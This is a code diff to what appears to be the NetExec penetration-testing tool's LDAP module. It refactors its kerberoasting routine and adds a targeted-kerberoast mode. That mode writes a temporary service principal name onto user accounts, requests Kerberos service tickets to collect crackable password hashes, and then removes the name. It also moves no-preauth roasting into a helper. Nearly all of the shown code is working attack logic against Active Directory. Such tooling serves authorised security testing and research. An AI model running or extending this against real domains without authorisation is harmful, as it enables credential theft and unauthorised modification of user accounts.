@@ -34,14 +34,14 @@ from impacket.krb5.types import Principal, KerberosException
 from impacket.ldap import ldap as ldap_impacket
 from impacket.ldap import ldaptypes
 from impacket.ldap import ldapasn1 as ldapasn1_impacket
-from impacket.ldap.ldap import LDAPFilterSyntaxError
+from impacket.ldap.ldap import LDAPFilterSyntaxError, MODIFY_REPLACE
 from impacket.smbconnection import SessionError
 from impacket.ntlm import getNTLMSSPType1
 
 from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
-from nxc.helpers.misc import get_bloodhound_info, convert, d2b
+from nxc.helpers.misc import get_bloodhound_info, convert, d2b, parse_argument
 from nxc.logger import NXCAdapter
 from nxc.protocols.ldap.bloodhound import BloodHound, resolve_collection_methods
 from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
@@ -970,57 +970,15 @@ class ldap(connection):
 
     def kerberoasting(self):
         if self.args.no_preauth_targets:
-            usernames = []
-            for item in self.args.no_preauth_targets:
-                if os.path.isfile(item):
-                    with open(item, encoding="utf-8") as f:
-                        usernames.extend(line.strip() for line in f if line.strip())
-                else:
-                    usernames.append(item.strip())
-
-            skipped = []
-            hashes = []
-
-            for spn in usernames:
-                base_name = spn.split("/", 1)[0].split("@", 1)[0].rstrip()
-
-                if base_name.lower() == "krbtgt" or base_name.endswith("$"):
-                    skipped.append(base_name)
-                    continue
-
-                if not self.username:
-                    self.logger.fail("Likely executed without password flag. Please run the command with -p ''")
-                    return
-                hashline = KerberosAttacks(self).get_tgs_no_preauth(self.username, spn)
-                if hashline:
-                    hashes.append(hashline)
-
-            if skipped:
-                self.logger.display(f"Skipping account: {', '.join(skipped)}")
-            if hashes:
-                self.logger.display(f"Total of records returned {len(hashes)}")
-            else:
-                self.logger.highlight("No entries found!")
-
-            for line in hashes:
-                self.logger.highlight(line)
-                if self.args.kerberoasting:
-                    with open(self.args.kerberoasting, "a+", encoding="utf-8") as f:
-                        f.write(line + "\n")
+            self.roast_no_preauth()
             return
 
-        if self.args.kerberoast_account:
-            target_accounts = []
-            for item in self.args.kerberoast_account:
-                if os.path.isfile(item):
-                    try:
-                        with open(item, encoding="utf-8") as f:
-                            target_accounts.extend(line.strip() for line in f if line.strip())
-                    except Exception as e:
-                        self.logger.fail(f"Failed to read file '{item}': {e}")
-                else:
-                    target_accounts.append(item.strip())
-
+        if self.args.targeted_kerberoast:
+            target_users = parse_argument(self.args.targeted_kerberoast)
+            user_filter = "".join(f"(sAMAccountName={user})" for user in target_users)
+            searchFilter = f"(&(objectCategory=person)(!(servicePrincipalName=*))(|{user_filter}))"
+        elif self.args.kerberoast_account:
+            target_accounts = parse_argument(self.args.kerberoast_account)
             self.logger.info(f"Targeting specific accounts for kerberoasting: {', '.join(target_accounts)}")
 
             # build search filter for specific users
@@ -1038,8 +996,10 @@ class ldap(connection):
             "pwdLastSet",
             "lastLogon",
             "objectClass",
+            "distinguishedName",
         ]
-        resp = self.search(searchFilter, attributes, 0)
+
+        resp = self.search(searchFilter, attributes)
         resp_parsed = parse_result_attributes(resp)
         self.logger.debug(f"Search Filter: {searchFilter}")
         self.logger.debug(f"Attributes: {attributes}")
@@ -1047,26 +1007,43 @@ class ldap(connection):
 
         if not resp_parsed:
             self.logger.highlight("No entries found!")
-        else:
-            # Filter disabled accounts
-            disabled_accounts = [x for x in resp_parsed if int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
-            for account in disabled_accounts:
-                self.logger.display(f"Skipping disabled account: {account['sAMAccountName']}")
+            return
 
-            # Get all enabled accounts
-            enabled = [x for x in resp_parsed if not int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
+        disabled_accounts = [x for x in resp_parsed if int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
+        for account in disabled_accounts:
+            self.logger.display(f"Skipping disabled account: {account['sAMAccountName']}")
+
+        enabled = [x for x in resp_parsed if not int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
+
+        if self.args.targeted_kerberoast:
+            self.logger.success(f"Found {len(enabled)} enabled users without SPN.")
+        else:
             self.logger.display(f"Total of records returned {len(enabled):d}")
 
-            for user in enabled:
-                # Perform Kerberos Attack
+        for user in enabled:
+            spn_added = False
+
+            if self.args.targeted_kerberoast:
+                try:
+                    self.ldap_connection.modify(user["distinguishedName"], {"servicePrincipalName": [(MODIFY_REPLACE, [f"cifs/{user['sAMAccountName']}"])]})
+                    self.logger.debug(f"SPN 'cifs/{user['sAMAccountName']}' added for {user['sAMAccountName']}")
+                    spn_added = True
+                except ldap_impacket.LDAPSessionError as e:
+                    if "insufficientAccessRights" in str(e) or "INSUFF_ACCESS_RIGHTS" in str(e):
+                        self.logger.fail(f"No write access to {user['sAMAccountName']}'s SPN attribute")
+                    else:
+                        self.logger.fail(f"LDAP error for {user['sAMAccountName']}: {e}")
+                        self.logger.debug("Traceback", exc_info=True)
+                    continue
+
+            try:
                 TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
                 self.logger.debug(f"TGT: {TGT}")
                 if TGT:
-                    downLevelLogonName = f"{self.targetDomain}\\{user['sAMAccountName']}"
                     try:
                         principalName = Principal()
                         principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
-                        principalName.components = [downLevelLogonName]
+                        principalName.components = [f"{self.targetDomain}\\{user['sAMAccountName']}"]
 
                         tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                             principalName,
@@ -1081,22 +1058,61 @@ class ldap(connection):
                             oldSessionKey,
                             sessionKey,
                             user["sAMAccountName"],
-                            downLevelLogonName,
+                            f"{self.targetDomain}\\{user['sAMAccountName']}",
                             is_computer="computer" in user.get("objectClass", [])
                         )
 
                         pwdLastSet = "<never>" if str(user.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["pwdLastSet"]))))
                         lastLogon = "<never>" if str(user.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["lastLogon"]))))
                         self.logger.display(f"sAMAccountName: {user['sAMAccountName']}, memberOf: {user.get('memberOf', [])}, pwdLastSet: {pwdLastSet}, lastLogon: {lastLogon}")
-                        self.logger.highlight(f"{out}")
+                        self.logger.highlight(out)
                         if self.args.kerberoasting:
                             with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
                                 hash_kerberoasting.write(out + "\n")
                     except Exception as e:
                         self.logger.debug(f"Exception: {e}", exc_info=True)
-                        self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
+                        self.logger.fail(f"Principal: {self.targetDomain}\\{user['sAMAccountName']} - {e}")
                 else:
                     self.logger.fail(f"Error retrieving TGT for {self.domain}\\{self.username} from {self.kdcHost}")
+            finally:
+                if spn_added:
+                    try:
+                        self.ldap_connection.modify(user["distinguishedName"], {"servicePrincipalName": [(MODIFY_REPLACE, [])]})
+                        self.logger.debug(f"SPN removed for {user['sAMAccountName']}")
+                    except Exception as cleanup_error:
+                        self.logger.fail(f"Failed to remove SPN for {user['sAMAccountName']}: {cleanup_error}")
+
+    def roast_no_preauth(self):
+        usernames = parse_argument(self.args.no_preauth_targets)
+
+        skipped = []
+        hashes = []
+
+        for spn in usernames:
+            base_name = spn.split("/", 1)[0].split("@", 1)[0].rstrip()
+
+            if base_name.lower() == "krbtgt" or base_name.endswith("$"):
+                skipped.append(base_name)
+                continue
+
+            if not self.username:
+                self.logger.fail("Likely executed without password flag. Please run the command with -p ''")
+                return
+            hashline = KerberosAttacks(self).get_tgs_no_preauth(self.username, spn)
+            if hashline:
+                hashes.append(hashline)
+
+        if skipped:
+            self.logger.display(f"Skipping account: {', '.join(skipped)}")
+        if hashes:
+            self.logger.display(f"Total of records returned {len(hashes)}")
+        else:
+            self.logger.highlight("No entries found!")
+
+        for line in hashes:
+            self.logger.highlight(line)
+            with open(self.args.kerberoasting, "a+") as f:
+                f.write(line + "\n")
 
     def query(self):
         """
